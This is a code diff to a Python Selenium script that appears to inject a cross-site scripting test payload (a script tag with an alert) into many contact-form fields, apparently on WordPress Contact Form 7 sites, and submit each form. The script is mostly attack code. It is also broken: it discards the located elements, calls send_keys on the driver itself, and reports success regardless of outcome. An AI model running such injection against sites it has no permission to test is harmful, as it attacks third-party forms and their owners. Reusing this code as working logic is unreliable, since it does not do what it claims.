@@ -18,64 +18,81 @@ def setup(url):
 def send_email():
     try: # these try blocks will get what version we are working with
         driver.find_elements(By.NAME,"your-subject") # your-subject
-        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") # 
         time.sleep(10)
         button = driver.find_element(By.ID, "button")
         driver.execute_script("arguments[0].click();", button)
-        #time.sleep(10)
-    except:
-        print("Element does not exist.")
-    try:
-        driver.find_elements(By.NAME,"your-email") # your-email
-        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
-        time.sleep(10)
-        button = driver.find_element(By.ID, "button")
-        driver.execute_script("arguments[0].click();", button)
-        #time.sleep(10)
-    except:
-        print("Element does not exist.")
-    try:
-        driver.find_elements(By.NAME,"email") # email
-        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
-        time.sleep(10)
-        button = driver.find_element(By.ID, "button")
-        driver.execute_script("arguments[0].click();", button)
-        #time.sleep(10)
-    except:
-        print("Element does not exist.")
-    try:
-        driver.find_elements(By.NAME,"message") # message
-        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
-        time.sleep(10)
-        button = driver.find_element(By.ID, "button")
-        driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
         #time.sleep(10)
     except:
         print("Element does not exist.")
     try:
         driver.find_elements(By.NAME,"subject") # subject
-        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") #
         time.sleep(10)
         button = driver.find_element(By.ID, "button")
         driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
+        #time.sleep(10)
+    except:
+        print("Element does not exist.")
+    try:
+        driver.find_elements(By.NAME,"your-email") # your-email
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") # 
+        time.sleep(10)
+        button = driver.find_element(By.ID, "button")
+        driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
+        #time.sleep(10)
+    except:
+        print("Element does not exist.")
+    try:
+        driver.find_elements(By.NAME,"email") # email
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") #
+        time.sleep(10)
+        button = driver.find_element(By.ID, "button")
+        driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
+        #time.sleep(10)
+    except:
+        print("Element does not exist.")
+    try:
+        driver.find_elements(By.NAME,"message") # message
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") #
+        time.sleep(10)
+        button = driver.find_element(By.ID, "button")
+        driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
         #time.sleep(10)
     except:
         print("Element does not exist.")
     try:
         driver.find_elements(By.NAME,"your-message") # your-message
-        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") # 
         time.sleep(10)
         button = driver.find_element(By.ID, "button")
         driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
         #time.sleep(10)
     except:
         print("Element does not exist.")
     try:
         driver.find_elements(By.NAME,"name") # name
-        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") # 
         time.sleep(10)
         button = driver.find_element(By.ID, "button")
         driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
+        #time.sleep(10)
+    except:
+        print("Element does not exist.")
+    try:
+        driver.find_elements(By.NAME,"your-name") # your-name
+        driver.send_keys("<Script>alert('Script entered.')</scripT>") #
+        time.sleep(10)
+        button = driver.find_element(By.ID, "button")
+        driver.execute_script("arguments[0].click();", button)
+        print("Found HTML element:")
         #time.sleep(10)
     except:
         print("Element does not exist.")
